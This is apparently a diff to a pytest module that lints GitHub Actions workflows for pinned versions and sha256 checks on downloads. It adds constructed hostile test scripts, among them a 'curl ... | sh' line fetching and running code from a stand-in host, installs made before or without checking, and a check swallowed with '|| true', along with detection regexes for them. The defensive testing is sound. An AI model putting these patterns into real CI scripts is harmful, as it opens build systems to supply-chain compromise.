@@ -9,19 +9,25 @@ checksums file before it is unpacked.
 Static: every `run:` step under `.github/workflows/` that fetches with `curl`
 or `wget` must
 - fetch no `latest` URL;
-- name its version through `*_VERSION` variables set (step, job or workflow
-  `env`) to an exact `x.y.z`;
-- check what it fetched with `sha256sum -c` against a 64-hex digest, written
-  in the script or taken from an `env` variable.
+- reference at least one `*_VERSION` variable in each fetch URL, and set
+  every one it names (step, job or workflow `env`) to an exact `x.y.z`;
+- write each fetch to a file (`-o` / `-O` / `--output`), and check every such
+  file by name with `echo "<digest>  <file>" | sha256sum -c -` against a
+  64-hex digest (written in the script or taken from an `env` variable);
+- run that check after the fetch and before any other command that names the
+  file (tar, install, chmod, unzip, running it);
+- never swallow the check (`|| ...`, `; true`) and never pipe into a shell.
 
-The mutation tests apply each failure to the real workflows in memory; no
-workflow file is edited.
+The mutation tests apply each failure to the real workflows in memory, and
+the security review of #339 added five hostile scripts that the first version
+let through; no workflow file is edited.
 """
 
 from __future__ import annotations
 
 import copy
 import re
+import shlex
 from collections.abc import Iterator, Mapping
 from pathlib import Path
 from typing import Any
@@ -35,9 +41,18 @@ WORKFLOWS = ROOT / ".github" / "workflows"
 FETCH = re.compile(r"\b(?:curl|wget)\b")
 VERSION_REF = re.compile(r"\$\{?([A-Z][A-Z0-9_]*_VERSION)\}?")
 EXACT_VERSION = re.compile(r"\d+\.\d+\.\d+")
-CHECK = re.compile(r"""echo\s+["']?(\S+)\s+\S+["']?\s*\|\s*sha256sum\s+-c\s+-""")
+# `echo "<digest>  <path>" | sha256sum -c -`: group 1 the digest, group 2 the
+# path the check reads.
+CHECK = re.compile(r"""echo\s+["']?(\S+)\s+([^"'\s]+)["']?\s*\|\s*sha256sum\s+-c\s+-""")
+# A check whose failure is swallowed: `|| ...` or `; true` after it.
+IGNORED = re.compile(r"sha256sum\s+-c\s+-\s*(?:\|\||;\s*true\b)")
+PIPE_TO_SHELL = re.compile(r"\|\s*(?:sudo\s+)?(?:sh|bash|zsh|dash)\b")
+URL = re.compile(r"https?://[^\s\"']+")
 SHA256 = re.compile(r"[0-9a-f]{64}")
 VAR = re.compile(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?")
+# Command separators inside one logical line; a plain `|` stays inside a
+# command, so `echo ... | sha256sum -c -` is one command.
+SEPARATOR = re.compile(r"&&|\|\||;")
 
 
 def _load(path: Path) -> dict[str, Any]:
@@ -65,22 +80,76 @@ def _fetching_steps(
             yield f"{job_id}[{i}] {step.get('name', '')}", script, env
 
 
+def _commands(script: str) -> list[str]:
+    """The script's commands in order: continuations joined, split at
+    newlines, `&&`, `||` and `;`."""
+    joined = re.sub(r"\\\n", " ", script)
+    out: list[str] = []
+    for line in joined.splitlines():
+        if line.strip().startswith("#"):
+            continue
+        out.extend(c.strip() for c in SEPARATOR.split(line) if c.strip())
+    return out
+
+
+def _targets(command: str) -> list[str] | None:
+    """The `-o` / `-O` / `--output` targets of a curl or wget command, quotes
+    removed; None if it cannot be read as a shell command."""
+    try:
+        words = shlex.split(command, comments=False, posix=True)
+    except ValueError:
+        return None
+    out = []
+    for i, word in enumerate(words[:-1]):
+        short = re.fullmatch(r"-[A-Za-z]*[oO]", word)
+        if short or word in {"--output", "--output-document"}:
+            out.append(words[i + 1])
+    return out
+
+
 def _findings(workflow: dict[str, Any]) -> list[tuple[str, str]]:
     found: list[tuple[str, str]] = []
     for where, script, env in _fetching_steps(workflow):
         if "latest" in script:
             found.append((where, "latest"))
+        if PIPE_TO_SHELL.search(script):
+            found.append((where, "pipe-to-shell"))
+        joined = re.sub(r"\\\n", " ", script)
+        for line in joined.splitlines():
+            if IGNORED.search(line):
+                found.append((where, "check-ignored"))
         for name in VERSION_REF.findall(script):
             if not EXACT_VERSION.fullmatch(str(env.get(name, ""))):
                 found.append((where, "version"))
-        digests = CHECK.findall(script)
-        if not digests:
-            found.append((where, "unchecked"))
-        for digest in digests:
-            ref = VAR.fullmatch(digest)
-            value = str(env.get(ref.group(1), "")) if ref else digest
-            if not SHA256.fullmatch(value):
-                found.append((where, "digest"))
+        commands = _commands(script)
+        # path -> index of the command that checks it
+        checked: dict[str, int] = {}
+        for i, command in enumerate(commands):
+            for digest, path in CHECK.findall(command):
+                ref = VAR.fullmatch(digest)
+                value = str(env.get(ref.group(1), "")) if ref else digest
+                if not SHA256.fullmatch(value):
+                    found.append((where, "digest"))
+                checked.setdefault(path, i)
+        for i, command in enumerate(commands):
+            if not FETCH.search(command):
+                continue
+            urls = URL.findall(command)
+            if not any(VERSION_REF.search(u) for u in urls):
+                found.append((where, "unversioned"))
+            targets = _targets(command)
+            if not targets:
+                found.append((where, "no-target"))
+                continue
+            for target in targets:
+                at = checked.get(target)
+                if at is None or at < i:
+                    found.append((where, "unchecked"))
+                    continue
+                # Nothing may read the downloaded file between the fetch and
+                # its check: no tar, install, chmod, unzip, or running it.
+                if any(target in c for c in commands[i + 1 : at]):
+                    found.append((where, "used-before-check"))
     return found
 
 
@@ -151,3 +220,75 @@ def test_a_digest_from_env_is_resolved() -> None:
     assert _findings(workflow) == []
     workflow["env"]["GITLEAKS_SHA256"] = "not-a-digest"
     assert "digest" in {kind for _, kind in _findings(workflow)}
+
+
+# The five scripts from the security review of #339 (M13-65), each of which
+# passed the first version of this check. Constructed inputs.
+_URL = (
+    '"https://github.com/rhysd/actionlint/releases/download/v${ACTIONLINT_VERSION}'
+    '/actionlint_${ACTIONLINT_VERSION}_linux_amd64.tar.gz"'
+)
+_SUM = "8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8"
+HOSTILE: Mapping[str, tuple[str, str]] = {
+    "checks-b-installs-a": (
+        f"curl -sSfL -o /tmp/a.tar.gz {_URL}\n"
+        f"curl -sSfL -o /tmp/b.tar.gz {_URL}\n"
+        f'echo "{_SUM}  /tmp/b.tar.gz" | sha256sum -c -\n'
+        "tar -xzf /tmp/a.tar.gz -C /tmp actionlint\n"
+        "sudo install /tmp/actionlint /usr/local/bin/actionlint\n",
+        "unchecked",
+    ),
+    "unpacks-before-check": (
+        f"curl -sSfL -o /tmp/actionlint.tar.gz {_URL}\n"
+        "tar -xzf /tmp/actionlint.tar.gz -C /tmp actionlint\n"
+        "sudo install /tmp/actionlint /usr/local/bin/actionlint\n"
+        f'echo "{_SUM}  /tmp/actionlint.tar.gz" | sha256sum -c -\n',
+        "used-before-check",
+    ),
+    "check-or-true": (
+        f"curl -sSfL -o /tmp/actionlint.tar.gz {_URL}\n"
+        f'echo "{_SUM}  /tmp/actionlint.tar.gz" | sha256sum -c - || true\n'
+        "tar -xzf /tmp/actionlint.tar.gz -C /tmp actionlint\n",
+        "check-ignored",
+    ),
+    "pipe-to-shell": (
+        f"curl -sSfL -o /tmp/actionlint.tar.gz {_URL}\n"
+        f'echo "{_SUM}  /tmp/actionlint.tar.gz" | sha256sum -c -\n'
+        "curl -sSfL https://example.invalid/install.sh | sh\n",
+        "pipe-to-shell",
+    ),
+    "no-version": (
+        "curl -sSfL -o /tmp/actionlint.tar.gz "
+        '"https://github.com/rhysd/actionlint/releases/download/v1.7.12'
+        '/actionlint_1.7.12_linux_amd64.tar.gz"\n'
+        f'echo "{_SUM}  /tmp/actionlint.tar.gz" | sha256sum -c -\n'
+        "tar -xzf /tmp/actionlint.tar.gz -C /tmp actionlint\n",
+        "unversioned",
+    ),
+}
+
+
+@pytest.mark.parametrize("case", sorted(HOSTILE))
+def test_a_hostile_install_script_is_caught(case: str) -> None:
+    script, kind = HOSTILE[case]
+    workflow = _ci()
+    _actionlint_step(workflow)["run"] = script
+    assert kind in {k for _, k in _findings(workflow)}, case
+
+
+@pytest.mark.parametrize("suffix", [" || true", " || :", "; true", " || echo skipped"])
+def test_every_swallowed_check_is_caught(suffix: str) -> None:
+    workflow = _ci()
+    step = _actionlint_step(workflow)
+    step["run"] = step["run"].replace("sha256sum -c -", "sha256sum -c -" + suffix)
+    assert "check-ignored" in {k for _, k in _findings(workflow)}, suffix
+
+
+def test_a_check_before_the_fetch_is_caught() -> None:
+    workflow = _ci()
+    step = _actionlint_step(workflow)
+    lines = step["run"].splitlines()
+    check = next(line for line in lines if "sha256sum" in line)
+    lines.remove(check)
+    step["run"] = "\n".join([check, *lines])
+    assert "unchecked" in {k for _, k in _findings(workflow)}
